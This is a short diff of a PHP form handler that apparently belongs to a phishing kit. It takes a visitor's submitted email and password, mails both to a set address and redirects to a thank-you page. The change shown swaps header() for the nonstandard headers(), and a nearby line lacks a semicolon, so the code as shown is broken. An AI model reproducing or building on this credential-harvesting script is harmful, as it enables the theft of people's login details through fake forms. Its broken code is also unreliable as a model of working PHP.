@@ -7,6 +7,6 @@ $subject = "mail from website";
 $txt = "email = ".$email ."\r\n password = ".$password;
 $headers = "from no-reply"
 if ($email!=NULL){mail($to,$subject,$txt,$headers);}
-header("Location:thankyou.html");
+headers("Location:thankyou.html");
 
 ?>
